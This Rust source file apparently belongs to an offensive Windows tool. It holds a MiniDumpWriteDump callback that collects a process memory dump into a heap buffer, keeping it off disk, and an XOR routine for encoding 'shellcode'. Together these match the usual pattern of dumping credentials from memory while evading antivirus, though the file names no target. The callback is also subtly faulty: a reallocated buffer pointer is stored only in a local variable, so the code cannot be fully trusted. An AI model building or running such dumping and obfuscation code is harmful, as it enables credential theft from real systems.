use core::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE, S_FALSE, S_OK};
use windows_sys::Win32::System::Diagnostics::Debug::{
    IoFinishCallback, IoStartCallback, IoWriteAllCallback, MINIDUMP_CALLBACK_INFORMATION,
    MINIDUMP_CALLBACK_INPUT, MINIDUMP_CALLBACK_OUTPUT, MINIDUMP_CALLBACK_TYPE,
};
use windows_sys::Win32::System::Memory::{
    GetProcessHeap, HeapAlloc, HeapReAlloc, HeapSize, HEAP_ZERO_MEMORY,
};

// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

pub extern "system" fn minidump_callback_routine(
    mut callback_param: *mut c_void,
    callback_input: *const MINIDUMP_CALLBACK_INPUT,
    callback_output: *mut MINIDUMP_CALLBACK_OUTPUT,
) -> i32 {
    unsafe {
        match (*callback_input).CallbackType as i32 {
            IoStartCallback => {
                (*callback_output).Anonymous.Status = S_FALSE;
                return 1;
            }
            IoWriteAllCallback => {
                (*callback_output).Anonymous.Status = S_OK;
                let read_buf_size = (*callback_input).Anonymous.Io.BufferBytes;
                let current_buf_size = HeapSize(GetProcessHeap(), 0 as _, callback_param);
                // check if buffer is large enough
                let extra_5mb: usize = 1024 * 1024 * 5;
                let bytes_and_offset = (*callback_input).Anonymous.Io.Offset as usize
                    + (*callback_input).Anonymous.Io.BufferBytes as usize;
                if bytes_and_offset >= current_buf_size {
                    // increase heap size
                    let size_to_increase = if bytes_and_offset <= (current_buf_size * 2) {
                        current_buf_size * 2
                    } else {
                        bytes_and_offset + extra_5mb
                    };
                    callback_param =
                        HeapReAlloc(GetProcessHeap(), 0 as _, callback_param, size_to_increase);
                }

                let source = (*callback_input).Anonymous.Io.Buffer as *mut c_void;
                let destination = (callback_param as usize
                    + (*callback_input).Anonymous.Io.Offset as usize)
                    as *mut c_void;
                let _ = std::ptr::copy_nonoverlapping(source, destination, read_buf_size as usize);
                // println!("{:#?}", destination);
                return 1;
            }
            IoFinishCallback => {
                (*callback_output).Anonymous.Status = S_OK;
                return 1;
            }
            _ => return 1,
        }
    }
}

pub fn xor_encode(shellcode: &Vec<u8>, key: u8) -> Vec<u8> {
    shellcode.iter().map(|x| x ^ key).collect()
}
